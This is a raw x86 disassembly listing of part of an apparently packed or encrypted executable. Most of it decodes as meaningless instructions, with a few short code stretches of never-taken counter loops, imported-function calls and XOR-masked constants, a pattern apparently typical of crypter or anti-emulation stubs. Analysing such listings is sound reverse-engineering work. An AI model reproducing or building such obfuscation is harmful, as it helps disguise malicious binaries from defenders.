  407250:	or     BYTE PTR [ebx],ch
  407252:	in     al,0x31
  407254:	int    0x40
  407256:	mov    WORD PTR [esi],es
  407258:	adc    dl,BYTE PTR [ecx+0x2ee407d7]
  40725e:	inc    ebx
  40725f:	jp     0x4071ef
  407261:	inc    esp
  407262:	and    DWORD PTR [edi+0x1d242328],edi
  407268:	aad    0x8c
  40726a:	and    al,0x27
  40726c:	inc    eax
  40726d:	shr    DWORD PTR ds:0x21f9f41,1
  407273:	cdq    
  407274:	test   al,0xd8
  407276:	sub    dl,BYTE PTR [edi]
  407278:	pop    esi
  407279:	mov    ecx,0xa7fae8ea
  40727e:	loop   0x40725e
  407280:	jns    0x407294
  407282:	aaa    
  407283:	addr16 addr16 mov esp,0xd917f494
  40728a:	in     eax,dx
  40728b:	sub    ecx,DWORD PTR [ebx]
  40728d:	stos   DWORD PTR es:[edi],eax
  40728e:	jne    0x4072a4
  407290:	or     DWORD PTR [esi],0x632a65e4
  407296:	mov    bl,0x2d
  407298:	daa    
  407299:	imul   edi,DWORD PTR [esi+0x6bf48eb9],0x26
  4072a0:	(bad)  
  4072a2:	js     0x4072d8
  4072a4:	sbb    eax,0x842a86b2
  4072a9:	mov    ecx,0x475be76f
  4072ae:	or     al,0x4c
  4072b0:	sbb    BYTE PTR [ebp-0x6d],al
  4072b3:	and    DWORD PTR ds:0x365cad2d,0xffffffca
  4072bb:	sbb    ah,BYTE PTR [ecx-0x74477403]
  4072c1:	push   ebp
  4072c2:	loopne 0x40724f
  4072c4:	pop    ebp
  4072c5:	clc    
  4072c6:	xor    edx,eax
  4072c8:	add    edx,ecx
  4072ca:	imul   edx,ebx
  4072cd:	cmp    edx,edi
  4072cf:	jbe    0x40619a
  4072d5:	pop    ebx
  4072d6:	jmp    0x407428
  4072db:	push   ds
  4072dc:	cld    
  4072dd:	dec    edi
  4072de:	or     ebp,DWORD PTR [ebp-0x27]
  4072e1:	jp     0x40728c
  4072e3:	adc    edi,0x77590f0c
  4072e9:	dec    edi
  4072ea:	cmp    eax,0x7e7e18f8
  4072ef:	and    edi,DWORD PTR [edi+0x7e]
  4072f2:	jle    0x40728a
  4072f4:	fdivrp st(3),st
  4072f6:	mov    esi,0x7ae0a2f5
  4072fb:	dec    ebp
  4072fc:	or     eax,0x3e2eb277
  407301:	add    edx,DWORD PTR [esi]
  407303:	sub    BYTE PTR [eax],al
  407305:	pop    ss
  407306:	or     esi,eax
  407308:	sub    DWORD PTR [edx],0x8e61133
  40730e:	xchg   esi,eax
  40730f:	or     al,0xe9
  407311:	mov    ds:0x360696b0,al
  407316:	dec    esi
  407317:	js     0x40737b
  407319:	ins    BYTE PTR es:[edi],dx
  40731a:	ja     0x407324
  40731c:	fimul  WORD PTR [eax]
  40731e:	adc    ecx,DWORD PTR [edx-0xe]
  407321:	in     al,0x7
  407323:	adc    DWORD PTR [edi+ecx*1-0x6b],esi
  407327:	push   edi
  407328:	jge    0x407333
  40732a:	fdivr  QWORD PTR [edx-0x7e]
  40732d:	ja     0x4073a9
  40732f:	xor    BYTE PTR [edx+ecx*2-0x690cb372],cl
  407336:	jnp    0x407365
  407338:	leave  
  407339:	lahf   
  40733a:	sbb    ah,BYTE PTR [ecx]
  40733c:	xor    esp,DWORD PTR [ebp+0x58]
  40733f:	sub    al,0xac
  407341:	das    
  407342:	ss inc ebx
  407344:	inc    esp
  407345:	push   ecx
  407346:	outs   dx,DWORD PTR ds:[esi]
  407347:	pop    ebp
  407348:	scas   al,BYTE PTR es:[edi]
  407349:	inc    eax
  40734a:	pop    ds
  40734b:	push   eax
  40734c:	and    DWORD PTR [edi+0x31034591],eax
  407352:	mov    edi,0x14e151f5
  407357:	in     al,0xa3
  407359:	loope  0x407313
  40735b:	retf   0x21d2
  40735e:	loop   0x4073b3
  407360:	lods   eax,DWORD PTR ds:[esi]
  407361:	adc    eax,0x27fceec1
  407366:	loopne 0x407302
  407368:	mov    ah,0xf3
  40736a:	cmc    
  40736b:	icebp  
  40736c:	inc    edx
  40736d:	jo     0x4073a6
  40736f:	cli    
  407370:	and    di,WORD PTR es:[esi]
  407374:	sbb    bh,BYTE PTR [ebp+0x1e677dd8]
  40737a:	mov    WORD PTR [esi],es
  40737c:	inc    esi
  40737d:	shr    DWORD PTR [edi],0xfb
  407380:	and    al,0xef
  407382:	imul   edi,DWORD PTR [ebx+0x12],0xffffffe4
  407386:	outs   dx,BYTE PTR ds:[esi]
  407387:	xchg   BYTE PTR [eax+0x7a],bl
  40738a:	outs   dx,DWORD PTR ds:[esi]
  40738b:	test   al,0x73
  40738d:	nop
  40738e:	add    BYTE PTR [eax-0x17],dl
  407391:	sub    ah,BYTE PTR ds:0xa165865c
  407397:	daa    
  407398:	out    0x8e,eax
  40739a:	ror    DWORD PTR [ebx-0x7e988393],0x5c
  4073a1:	imul   ebx,DWORD PTR [ebx-0x6a],0xbc2156b3
  4073a8:	jno    0x4073ae
  4073aa:	inc    esp
  4073ab:	or     ebp,DWORD PTR [ecx+0x18]
  4073ae:	mov    bh,0xe3
  4073b0:	jo     0x4073cc
  4073b2:	pop    ecx
  4073b3:	out    dx,al
  4073b4:	rol    DWORD PTR [ecx-0x63214201],0x78
  4073bb:	adc    BYTE PTR [edx-0x45265524],0x2e
  4073c2:	daa    
  4073c3:	push   ebp
  4073c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073c5:	idiv   BYTE PTR [eax]
  4073c7:	dec    edi
  4073c8:	xchg   ebp,eax
  4073c9:	mov    bl,0xa1
  4073cb:	ret    0xa8a3
  4073ce:	sbb    DWORD PTR ds:0x6c194afd,0xffffffd9
  4073d5:	add    dl,BYTE PTR [esi-0x317a57c3]
  4073db:	jecxz  0x40737f
  4073dd:	cmp    ecx,DWORD PTR [ebx-0x20337e06]
  4073e3:	aas    
  4073e4:	arpl   cx,di
  4073e6:	push   ecx
  4073e7:	xchg   edx,eax
  4073e8:	outs   dx,BYTE PTR ds:[esi]
  4073e9:	imul   ebx,eax,0xa8447eb1
  4073ef:	sbb    esi,0xffffffa1
  4073f2:	jb     0x4073c2
  4073f4:	push   cs
  4073f5:	xor    DWORD PTR [edi+0x32],esi
  4073f8:	push   esp
  4073f9:	data16 cmp bl,al
  4073fc:	jns    0x407446
  4073fe:	inc    eax
  4073ff:	and    al,0x17
  407401:	aad    0x8f
  407403:	loopne 0x40745c
  407405:	push   0xbe54661e
  40740a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40740b:	push   es
  40740c:	dec    edx
  40740d:	dec    ebp
  40740e:	(bad)  
  407410:	push   edi
  407411:	xchg   esp,eax
  407412:	cdq    
  407413:	mov    eax,0x1a5bb215
  407418:	fdiv   st,st(1)
  40741a:	add    BYTE PTR [edi],0x81
  40741d:	js     0x4073c7
  40741f:	jl     0x4073b3
  407421:	jecxz  0x4073f7
  407423:	mov    eax,es
  407425:	pop    eax
  407426:	in     eax,0x82
  407428:	pop    edi
  407429:	leave  
  40742a:	ret    0x8
  40742d:	push   ebp
  40742e:	mov    ebp,esp
  407430:	jmp    0x4075bc
  407435:	jb     0x407447
  407437:	test   eax,0x8a95a91d
  40743c:	adc    DWORD PTR [ebp+eax*1+0x32a027ff],edi
  407443:	xlat   BYTE PTR ds:[ebx]
  407444:	mov    eax,ds:0x7e7e19ad
  407449:	jmp    0xf0bef2cd
  40744e:	cld    
  40744f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407450:	xor    al,0xa4
  407452:	cwde   
  407453:	xor    al,0x8e
  407455:	jno    0x4074b0
  407457:	adc    ebx,esp
  407459:	mov    ds,WORD PTR [ebx-0x77ec21e]
  40745f:	or     esp,DWORD PTR [esi-0x9]
  407462:	rol    edi,1
  407464:	ja     0x4074a4
  407466:	inc    edx
  407467:	jmp    0xf8593426
  40746c:	sub    DWORD PTR [ecx+edi*4-0x7e678dd8],esi
  407473:	hlt    
  407474:	or     esi,ebx
  407476:	mov    WORD PTR [esi+0x1ceb053b],?
  40747c:	in     al,0xa2
  40747e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40747f:	mov    al,0xa7
  407481:	in     eax,dx
  407482:	jo     0x407495
  407484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407486:	loopne 0x407490
  407488:	retf   
  407489:	xor    DWORD PTR [ecx+0x2],edx
  40748c:	pop    esi
  40748d:	pop    ebp
  40748e:	jmp    0x407411
  407490:	stos   BYTE PTR es:[edi],al
  407491:	aaa    
  407492:	mov    dl,BYTE PTR [ecx+0x6b8493c0]
  407498:	xchg   esi,eax
  407499:	icebp  
  40749a:	or     al,BYTE PTR [esi]
  40749c:	mov    WORD PTR [ecx+0x219486bf],cs
  4074a2:	mov    bh,0xcc
  4074a4:	pop    ecx
  4074a5:	nop
  4074a6:	pop    ds
  4074a7:	arpl   WORD PTR [ecx+0x57f5abc7],si
  4074ad:	adc    eax,0xc50a191b
  4074b2:	aam    0xe7
  4074b4:	outs   dx,BYTE PTR ds:[esi]
  4074b5:	push   ds
  4074b6:	arpl   WORD PTR [esi-0x27],dx
  4074b9:	xor    al,0x75
  4074bb:	mov    ch,0xe1
  4074bd:	mov    eax,ds:0xd7afa49f
  4074c2:	sahf   
  4074c3:	cmp    DWORD PTR [ebx+esi*4+0x747cdcbf],eax
  4074ca:	in     eax,0x42
  4074cc:	test   al,0x50
  4074ce:	mov    edx,0xdb459426
  4074d3:	fisttp WORD PTR [esi+0x56410d3]
  4074d9:	adc    cl,bh
  4074db:	sbb    DWORD PTR [ecx-0x528914ef],edi
  4074e1:	in     eax,dx
  4074e2:	lods   eax,DWORD PTR ds:[esi]
  4074e3:	inc    eax
  4074e4:	je     0x407493
  4074e6:	or     BYTE PTR [ebx-0x60],bh
  4074e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074ea:	fidiv  DWORD PTR [edx]
  4074ec:	daa    
  4074ed:	inc    edx
  4074ee:	dec    edi
  4074ef:	jbe    0x407567
  4074f1:	cmp    BYTE PTR [edi-0x4557faf2],0x97
  4074f8:	push   ebx
  4074f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074fa:	mov    cl,0x9b
  4074fc:	lahf   
  4074fd:	in     al,dx
  4074fe:	jae    0x407531
  407500:	xor    eax,0x3c1ca5d2
  407505:	xchg   DWORD PTR [edi],esi
  407507:	pop    esi
  407508:	sub    eax,0x36294868
  40750d:	lods   eax,DWORD PTR ds:[esi]
  40750e:	cmp    DWORD PTR [edi+0x61],edi
  407511:	jg     0x40753a
  407513:	sub    DWORD PTR [esi-0x16],ecx
  407516:	lahf   
  407517:	inc    edx
  407518:	jl     0x407550
  40751a:	and    BYTE PTR [esi+eiz*1-0xc],bl
  40751e:	imul   edi,DWORD PTR [ecx],0x585a27cd
  407524:	lods   eax,DWORD PTR ds:[esi]
  407525:	mov    ch,0xc3
  407527:	inc    ecx
  407528:	cmp    al,BYTE PTR [edi+0x6186497b]
  40752e:	rol    cl,0x95
  407531:	into   
  407532:	nop
  407533:	cmc    
  407534:	adc    eax,0xe75b8963
  407539:	enter  0xa90c,0xb5
  40753d:	mov    esp,0x37d28f9c
  407542:	dec    eax
  407543:	dec    ebx
  407544:	push   ebx
  407545:	pop    esi
  407546:	jmp    0x4075aa
  407548:	stos   BYTE PTR es:[edi],al
  407549:	aam    0x60
  40754b:	out    dx,eax
  40754c:	call   0x387c:0xf703ed29
  407553:	jg     0x4075a0
  407555:	jbe    0x407585
  407557:	cwde   
  407558:	or     bl,BYTE PTR [edx+0x2b252e84]
  40755e:	nop
  40755f:	xlat   BYTE PTR ds:[ebx]
  407560:	out    0xce,al
  407562:	and    al,0x86
  407564:	test   BYTE PTR [eax+0x53],0xd4
  407568:	fwait
  407569:	cmp    eax,0xaa06fbe0
  40756e:	mov    eax,0x66a13e84
  407573:	dec    ecx
  407574:	fisub  DWORD PTR [ebx-0x75]
  407577:	call   0xd2f6:0xedabb34
  40757e:	xchg   ebx,eax
  40757f:	mul    DWORD PTR [esi+0x691a2c36]
  407585:	fild   QWORD PTR [ecx+edx*2]
  407588:	aam    0x77
  40758a:	xor    eax,0x95b8ea65
  40758f:	clc    
  407590:	mov    eax,0x4f25d7b4
  407595:	xchg   DWORD PTR [ebp+ecx*4-0x59],ebp
  407599:	or     eax,0xf18d5f43
  40759e:	add    bl,BYTE PTR [ebx-0x9]
  4075a1:	dec    ecx
  4075a2:	fnstsw WORD PTR [ebx]
  4075a4:	xchg   edx,eax
  4075a5:	sub    dh,BYTE PTR [ebx+0x13]
  4075a8:	or     cl,BYTE PTR ds:0x59ae6800
  4075ae:	mov    ecx,DWORD PTR [edi]
  4075b0:	ins    DWORD PTR es:[edi],dx
  4075b1:	rep ins DWORD PTR es:[edi],dx
  4075b3:	jp     0x4075a8
  4075b5:	loop   0x40755b
  4075b7:	addr16 pop ebx
  4075b9:	sub    eax,DWORD PTR [edi-0x7eaeaec2]
  4075bf:	and    eax,0x41aa3e
  4075c4:	add    BYTE PTR [eax],al
  4075c6:	add    BYTE PTR [eax],al
  4075c8:	jmp    0x4075da
  4075cd:	mov    edx,DWORD PTR ds:0x41aa3e
  4075d3:	inc    edx
  4075d4:	mov    DWORD PTR ds:0x41aa3e,edx
  4075da:	cmp    DWORD PTR ds:0x41aa3e,0x1e
  4075e1:	jae    0x407619
  4075e7:	cmp    DWORD PTR ds:0x41aa3e,0x20
  4075ee:	jne    0x40760a
  4075f4:	push   DWORD PTR [ebp-0x28]
  4075f7:	push   0x365e
  4075fc:	push   DWORD PTR [ebp-0x18]
  4075ff:	push   0x4c62
  407604:	call   DWORD PTR ds:0x40d004
  40760a:	jmp    0x4075cd
  40760f:	xor    DWORD PTR ds:0x412304,0x3a52
  407619:	mov    eax,0xf89c8538
  40761e:	sub    ecx,ecx
  407620:	mov    DWORD PTR [ebp-0x8],eax
  407623:	and    DWORD PTR ds:0x41aa46,0x0
  40762d:	jmp    0x40763f
  407632:	mov    ecx,DWORD PTR ds:0x41aa46
  407638:	inc    ecx
  407639:	mov    DWORD PTR ds:0x41aa46,ecx
  40763f:	cmp    DWORD PTR ds:0x41aa46,0x1e
  407646:	jae    0x4076c6
  40764c:	cmp    DWORD PTR ds:0x41aa46,0x2d
  407653:	jne    0x40765f
  407659:	call   DWORD PTR ds:0x40d1d8
  40765f:	jmp    0x407632
  407664:	and    DWORD PTR ds:0x417d15,0x0
  40766e:	jmp    0x407680
  407673:	mov    edx,DWORD PTR ds:0x417d15
  407679:	inc    edx
  40767a:	mov    DWORD PTR ds:0x417d15,edx
  407680:	cmp    DWORD PTR ds:0x417d15,0x1b
  407687:	jae    0x4076c6
  40768d:	cmp    DWORD PTR ds:0x417d15,0x8
  407694:	jne    0x4076a5
  40769a:	push   0x41aa5a
  40769f:	call   DWORD PTR ds:0x40d1dc
  4076a5:	cmp    DWORD PTR ds:0x417d15,0x7
  4076ac:	jne    0x4076c1
  4076b2:	xor    edx,edx
  4076b4:	add    edx,DWORD PTR ds:0x417d15
  4076ba:	inc    edx
  4076bb:	mov    DWORD PTR ds:0x417d15,edx
  4076c1:	jmp    0x407673
  4076c6:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  4076cd:	mov    edx,DWORD PTR [ebp-0x8]
  4076d0:	push   esi
  4076d1:	adc    esi,ecx
  4076d3:	mov    ecx,0x7510859
  4076d8:	xor    edx,ecx
  4076da:	mov    esi,0x32729f
  4076df:	push   edi
  4076e0:	mov    edi,DWORD PTR [ebp+0x10]
  4076e3:	add    edx,esi
  4076e5:	cmp    edi,edx
  4076e7:	jmp    0x407873
  4076ec:	iret   
  4076ed:	in     eax,0x74
  4076ef:	push   edx
  4076f0:	adc    al,0x63
  4076f2:	jns    0x40776d
  4076f4:	int    0x3e
  4076f6:	les    ebp,FWORD PTR [esi+0x63]
  4076f9:	sbb    DWORD PTR [edi-0xb],edi
  4076fc:	sbb    al,0x1f
  4076fe:	jle    0x40777e
  407700:	jmp    0xc3bef584
  407705:	jp     0x407699
  407707:	(bad)  
  407708:	fdiv   QWORD PTR ds:0x7c1fba09
  40770e:	enter  0xa9b9,0x4e
  407712:	imul   ebp,DWORD PTR [ebp-0x36],0xafd437e3
  407719:	adc    ecx,esi
  40771b:	push   esp
  40771c:	and    eax,0x86905e36
  407721:	jo     0x4076e6
  407723:	pop    es
  407724:	adc    BYTE PTR [ebx],0x8c
  407727:	addr16 xchg esi,eax
  407729:	and    al,0x62
  40772b:	aas    
  40772c:	xchg   esp,eax
  40772d:	pop    ds
  40772e:	scas   al,BYTE PTR es:[edi]
  40772f:	push   ebx
  407730:	rol    DWORD PTR cs:[eax],cl
  407733:	stos   BYTE PTR es:[edi],al
  407734:	mov    dl,0x3d
  407736:	push   ss
  407737:	ret    
  407738:	jbe    0x4076fc
  40773a:	sub    DWORD PTR [esi-0x1856d78c],edi
  407740:	sub    esp,DWORD PTR [ebx-0x4d1483b3]
  407746:	pop    ds
  407747:	adc    DWORD PTR gs:[ebx-0x5e],eax
  40774b:	scas   al,BYTE PTR es:[edi]
  40774c:	adc    ch,BYTE PTR [ecx+0x3a9f3bbc]
  407752:	xchg   ecx,ebx
  407754:	sbb    edx,ebx
  407756:	stos   BYTE PTR es:[edi],al
  407757:	not    DWORD PTR [edx]
  407759:	fs ds cmp dh,bl
  40775d:	lods   eax,DWORD PTR ds:[esi]
  40775e:	test   eax,0x26f76577
  407763:	add    ah,BYTE PTR ds:0x4371c1c6
  407769:	cdq    
  40776a:	inc    edi
  40776b:	unpcklps xmm2,XMMWORD PTR [ecx+0x6deed9d3]
  407772:	mov    al,ds:0x995cbf2b
  407777:	nop
  407778:	sub    BYTE PTR [esi+0x3d79f216],dl
  40777e:	mov    eax,ecx
  407780:	jp     0x40770c
  407782:	bound  ebp,QWORD PTR [esi]
  407784:	inc    edi
  407785:	sub    eax,0x9fe15bc4
  40778a:	scas   eax,DWORD PTR es:[edi]
  40778b:	or     ebx,eax
  40778d:	lahf   
  40778e:	stc    
  40778f:	dec    ecx
  407790:	das    
  407791:	cmp    edi,DWORD PTR [ebx-0x3a]
  407794:	aad    0xf0
  407796:	pushw  0x9b25
  40779a:	lock aaa 
  40779c:	sbb    al,0x49
  40779e:	mov    ecx,0xb403d373
  4077a3:	mov    edi,0xf4b18b36
  4077a8:	mov    edi,0xa522dcf3
  4077ad:	add    al,0xbf
  4077af:	push   ecx
  4077b0:	aaa    
  4077b1:	call   FWORD PTR [eax-0x1adeb459]
  4077b7:	sub    ch,dh
  4077b9:	pop    es
  4077ba:	rcr    BYTE PTR [esi-0x49],1
  4077bd:	(bad)  
  4077be:	jmp    0x4077ef
  4077c0:	lods   eax,DWORD PTR ds:[esi]
  4077c1:	pop    eax
  4077c2:	pushf  
  4077c3:	stos   DWORD PTR es:[edi],eax
  4077c4:	prefetch BYTE PTR [esi+0x35]
  4077c8:	sub    DWORD PTR [ebp+0x27],edx
  4077cb:	inc    edx
  4077cc:	xor    bl,bh
  4077ce:	add    al,0x35
  4077d0:	aas    
  4077d1:	ins    BYTE PTR es:[edi],dx
  4077d2:	cdq    
  4077d3:	push   ss
  4077d4:	popa   
  4077d5:	es cmp eax,0xf26410ad
  4077db:	xor    DWORD PTR [esi+0x27958584],edi
  4077e1:	sub    BYTE PTR [ebp-0x19],cl
  4077e4:	push   esp
  4077e5:	sbb    eax,0xe40064e
  4077ea:	invlpg BYTE PTR cs:0x3f348748
  4077f2:	pop    edx
  4077f3:	mov    al,0xa8
  4077f5:	cmp    esi,DWORD PTR [esp+ebx*8-0x41be548f]
  4077fc:	pop    ecx
  4077fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077fe:	xchg   ebx,eax
  4077ff:	daa    
  407800:	mov    cl,0xf7
  407802:	sbb    eax,0x24e77f84
  407807:	adc    BYTE PTR [edi+0x2f1dba1b],ch
  40780d:	js     0x40779f
  40780f:	inc    ebp
  407810:	retf   0x9ec7
  407813:	mov    DWORD PTR [ebx],edx
  407815:	jecxz  0x4077c3
  407817:	pop    es
  407818:	mov    esi,0x92e7ea4a
  40781d:	add    al,0x6d
  40781f:	jmp    0x9d1b:0xa01e17ef
  407826:	push   0x70
  407828:	fsub   QWORD PTR [esi]
  40782a:	xchg   BYTE PTR [ecx-0x6b8b252d],dh
  407830:	push   edx
  407831:	leave  
  407832:	fs mov dl,0xf6
  407835:	push   0xffffffa1
  407837:	and    al,0xd1
  407839:	out    0x2,eax
  40783b:	sub    eax,0x82020c8f
  407840:	cwde   
  407841:	imul   ebp,edx,0x80740304
  407847:	or     cl,BYTE PTR [edx+0x6f98a37e]
  40784d:	in     al,0xe9
  40784f:	sub    edx,DWORD PTR [eax+0x3b6b9b5e]
  407855:	push   eax
  407856:	dec    ebp
  407857:	popa   
  407858:	and    BYTE PTR [edx],dl
  40785a:	int3   
  40785b:	dec    eax
  40785c:	and    esp,DWORD PTR [eax+edx*8+0x67]
  407860:	adc    esi,DWORD PTR [eax+0x69e8f5f7]
  407866:	xor    esp,esp
  407868:	adc    eax,0x31cecc5f
  40786d:	sub    al,BYTE PTR [eax-0x56]
  407870:	aam    0x72
  407872:	aas    
  407873:	je     0x407c04
  407879:	jmp    0x407a05
  40787e:	in     eax,dx
  40787f:	(bad)  
  407880:	pop    esi
  407881:	jg     0x4078d7
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	ins    DWORD PTR es:[edi],dx
  407885:	in     eax,0x5e
  407887:	imul   eax,DWORD PTR [esi-0x56a3c874],0xffffffa1
  40788e:	(bad)  
  40788f:	sbb    al,0x7e
  407891:	jle    0x40787c
  407893:	jg     0x407913
  407895:	jle    0x4078ad
  407897:	dec    edi
  407898:	into   
  407899:	(bad)  
  40789a:	fucom  st(5)
  40789c:	push   ecx
  40789d:	xor    al,0x87
  40789f:	sbb    eax,0xd554c56b
  4078a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078a5:	cdq    
  4078a6:	push   ss
  4078a7:	iret   
  4078a8:	cwde   
  4078a9:	pop    esi
  4078aa:	ss cmp ah,cl
  4078ad:	jmp    0x3bb9:0x4c188655
  4078b4:	sub    edx,DWORD PTR [eax-0x2b]
  4078b7:	xor    dh,BYTE PTR [eax]
  4078b9:	mov    ah,0x80
  4078bb:	test   BYTE PTR [ebx],bh
  4078bd:	add    edx,esi
  4078bf:	xchg   edi,eax
  4078c0:	fs sbb edi,edx
  4078c3:	jbe    0x407939
  4078c5:	arpl   si,ax
  4078c7:	mov    esi,0xce479a69
  4078cc:	aas    
  4078cd:	ror    BYTE PTR [ebp-0xc],0x33
  4078d1:	lods   eax,DWORD PTR ds:[esi]
  4078d2:	pop    eax
  4078d3:	pop    ecx
  4078d4:	adc    edi,edi
  4078d6:	dec    ebp
  4078d7:	sub    cl,bh
  4078d9:	addr16 dec edi
  4078db:	sub    DWORD PTR [ebp+0x5f2c59f],esp
  4078e1:	repz xchg ebx,eax
  4078e3:	xlat   BYTE PTR ds:[ebx]
  4078e4:	(bad)  [ecx-0x44]
  4078e7:	(bad)  
  4078e8:	jno    0x407892
  4078ea:	cmp    eax,0xdb1e2b4c
  4078ef:	inc    ebp
  4078f0:	sbb    al,0xe
  4078f2:	sbb    cl,bl
  4078f4:	push   edx
  4078f5:	xchg   esp,eax
  4078f6:	das    
  4078f7:	cs mov bl,0x59
  4078fa:	cld    
  4078fb:	pop    ebx
  4078fc:	push   es
  4078fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078fe:	iret   
  4078ff:	mov    ecx,0x84a0b958
  407904:	push   ss
  407905:	lahf   
  407906:	mov    BYTE PTR [esi+ebp*1-0x1f],dl
  40790a:	scas   eax,DWORD PTR es:[edi]
  40790b:	fstp   TBYTE PTR [edx-0x47]
  40790e:	repz push esp
  407910:	jnp    0x407953
  407912:	retf   0x6f23
  407915:	(bad)  
  407916:	aas    
  407917:	dec    edi
  407918:	scas   al,BYTE PTR es:[edi]
  407919:	test   DWORD PTR [edx+0x10],0x3fdc1a4e
  407920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407921:	pop    ss
  407922:	push   0x0
  407924:	xlat   BYTE PTR ds:[ebx]
  407925:	adc    eax,DWORD PTR [edx+ebx*1]
  407928:	pusha  
  407929:	xabort 0x64
  40792c:	inc    ebx
  40792d:	xor    edx,esi
  40792f:	cmp    eax,0x9f6dd146
  407934:	push   edi
  407935:	fldcw  WORD PTR [ebp-0x547058c6]
  40793b:	fstp   QWORD PTR [eax+0x5ff106a9]
  407941:	imul   ebx,ebp,0x9f87f613
  407947:	mov    DWORD PTR [eax+0x4f],edx
  40794a:	or     eax,0xfe394fb8
  40794f:	mov    WORD PTR [edi-0x606229f9],?
  407955:	dec    ecx
  407956:	fbld   TBYTE PTR [esi-0x26b4983f]
  40795c:	(bad)  
  40795e:	jno    0x4078ef
  407960:	ret    0x52cb
  407963:	inc    ebp
  407964:	jnp    0x4079e2
  407966:	cmp    ecx,DWORD PTR [eax-0x5a]
  407969:	jo     0x407925
  40796b:	mov    eax,0xeb34a2b7
  407970:	mov    cl,0x21
  407972:	repnz test DWORD PTR [edi],ebp
  407975:	jmp    0x9409:0x6c24a850
  40797c:	mov    WORD PTR [ecx],fs
  40797e:	sbb    esi,DWORD PTR [ebx+0x58]
  407981:	in     eax,dx
  407982:	dec    edi
  407983:	(bad)  
  407984:	ror    DWORD PTR [ebx+0x30a5acdb],1
  40798a:	clc    
  40798b:	mov    al,ds:0x16130621
  407990:	or     al,cl
  407992:	pushf  
  407993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407994:	and    DWORD PTR [esi],esp
  407996:	sbb    ah,BYTE PTR [eax+esi*4-0x75]
  40799a:	aaa    
  40799b:	jle    0x4079fb
  40799d:	push   esi
  40799e:	jmp    0x407926
  4079a0:	call   0x368d1baf
  4079a5:	gs xor eax,0x4f0ef96a
  4079ab:	cwde   
  4079ac:	mov    dh,0xd8
  4079ae:	mov    al,ds:0xed4d3d3b
  4079b3:	sub    bl,BYTE PTR [ebp-0x138a9c55]
  4079b9:	add    eax,0x2fb5ae75
  4079be:	sub    eax,DWORD PTR [esi]
  4079c0:	jmp    0xb9e9be26
  4079c5:	aad    0xc2
  4079c7:	xchg   ebx,eax
  4079c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079c9:	and    BYTE PTR [edx+eiz*2],0xb5
  4079cd:	pop    ebx
  4079ce:	jmp    0x407979
  4079d0:	cwde   
  4079d1:	test   BYTE PTR [edi+0x7656def8],dh
  4079d7:	popa   
  4079d8:	sbb    esp,0xffffff92
  4079db:	cmp    BYTE PTR [ebx-0x4cc869a0],bl
  4079e1:	ss xchg esp,eax
  4079e3:	pop    eax
  4079e4:	mov    ds:0x538fb7dc,eax
  4079e9:	loop   0x4079d5
  4079eb:	adc    BYTE PTR [eax],dl
  4079ed:	xchg   esi,eax
  4079ee:	sub    cl,ah
  4079f0:	sbb    eax,0x68e5b89c
  4079f5:	fstp   st(0)
  4079f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079f8:	push   es
  4079f9:	popa   
  4079fa:	inc    ebx
  4079fb:	xchg   edx,eax
  4079fc:	dec    esi
  4079fd:	cmp    eax,0xacb588b4
  407a02:	in     al,0x78
  407a04:	enter  0x558b,0xf8
  407a08:	mov    eax,DWORD PTR [ebp-0x4]
  407a0b:	xor    eax,ecx
  407a0d:	mov    edi,0xffcd8d61
  407a12:	sub    edi,eax
  407a14:	jmp    0x407ba0
  407a19:	les    edi,FWORD PTR [eax]
  407a1b:	add    ch,BYTE PTR [edi-0x1e]
  407a1e:	gs jns 0x4079da
  407a21:	dec    esp
  407a22:	hlt    
  407a23:	sbb    BYTE PTR [ecx-0x7d],0xe0
  407a27:	(bad)  
  407a28:	lods   al,BYTE PTR ds:[esi]
  407a29:	jle    0x407a3d
  407a2b:	jle    0x407aab
  407a2d:	jmp    0x3abef8b1
  407a32:	or     al,0xd1
  407a34:	test   eax,0x78020054
  407a39:	mov    ds:0xc250cd97,al
  407a3e:	fsub   DWORD PTR [ecx+0xa37957e]
  407a44:	jmp    0xd841d086
  407a49:	out    dx,al
  407a4a:	push   0x68
  407a4c:	xchg   esi,eax
  407a4d:	aam    0x8a
  407a4f:	and    BYTE PTR [edx-0x667c6ec7],cl
  407a55:	leave  
  407a56:	rcr    DWORD PTR [esi+0x17384416],cl
  407a5c:	les    esi,FWORD PTR ds:0xcde22ec6
  407a62:	jp     0x407ad7
  407a64:	rol    edi,1
  407a66:	push   0x4b53f852
  407a6b:	dec    eax
  407a6c:	mov    ss,WORD PTR [esi-0x7b207c1a]
  407a72:	mov    DWORD PTR [esi+esi*8-0x58],edi
  407a76:	cli    
  407a77:	cmp    al,0x82
  407a79:	mov    bh,0x3f
  407a7b:	cmp    ebx,esi
  407a7d:	add    ah,ch
  407a7f:	dec    edi
  407a80:	mov    al,ds:0x227b83c
  407a85:	mov    edx,0x3aebe8e5
  407a8a:	popf   
  407a8b:	or     DWORD PTR [ecx],esp
  407a8d:	pusha  
  407a8e:	shl    dh,1
  407a90:	push   ss
  407a91:	std    
  407a92:	enter  0x6e3d,0xf8
  407a96:	test   eax,0x74b9de4
  407a9b:	ret    
  407a9c:	xchg   DWORD PTR [ebx-0x4521ad2d],esp
  407aa2:	inc    ecx
  407aa3:	inc    eax
  407aa4:	addr16 js 0x407b19
  407aa7:	xor    al,0xf
  407aa9:	and    eax,0xa0fdd874
  407aae:	shr    BYTE PTR [ebx+0x27292f91],0x6b
  407ab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
